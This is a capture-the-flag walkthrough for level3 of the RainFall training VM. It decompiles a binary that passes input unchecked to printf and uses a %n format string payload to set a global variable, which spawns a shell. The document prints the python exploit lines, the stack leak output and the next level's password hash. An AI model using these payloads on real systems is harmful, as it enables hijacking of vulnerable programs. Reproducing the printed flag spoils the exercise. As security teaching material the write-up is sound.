get the binary on host
* `scp -P 4242 level3@192.168.56.107:./level2 ./binary/level3`

decompile using ghidra

When we disasemble the main function, we can see the main call a v() function 

 0x08048520 <+6>:     call   0x80484a4 <v>

 in c does this:

```c
unsigned int m;

void v(void)
{
  char buffer[520];
  
  fgets(buffer,520,stdin);
  printf("%s", buffer);
  if (m == 0x40)    --> 64 in decimal
  {
    fwrite("Wait what?!\n",1,stdout);
    system("/bin/sh");
  }
  return;
}

 void main(void)
{
  v();
  return;
}

```
The program is simple, it's calling function v() wich check if the value of m, a global unitialize variable, is equal to 64.
If it is, then it launch a shell so we can get our .pass.

fgets is protected against buffer overflow, but there is an exploit called string attack we can use on printf.
It uses the %n modifier wich writes the number of bytes into a pointer.
The goal is to use the modifier '%n' to change the m value at the right place on the stack.

first we need to get the address of m, quick look on ghidra, it is: 0804988c

Now we have to display the memory address in the stack until we reach that address:

level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08 %x %x %x %x %x'" > /tmp/file

level3@RainFall:~$ cat /tmp/file | ./level3
� 200 b7fd1ac0 b7ff37d0 804988c 20782520

So we can count 3 addresses before m, and 4 including it. Now we can build our exploit:

python -c "print '\x8c\x98\x04\x08' + 'z'* 60 + '%4\$n'" > /tmp/file

we write 60 bytes, the '4\$' inf the '%n' modifier is here to tell the fonction to skip the 3 addresses so we are a the good position in the stack.\
60 bytes + \x8c\x98\x04\x08 wich is 4 bytes makes 64 written to the m variable address (\x8c\x98\x04\x08)
```
level3@RainFall:~$ python -c "print '\x8c\x98\x04\x08' + '\x90' * 60 + '%4\$n'" > /tmp/exploit_3 ; cat /tmp/exploit_3 - | ./level3`
�������������������������������������������������������������
Wait what?!
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
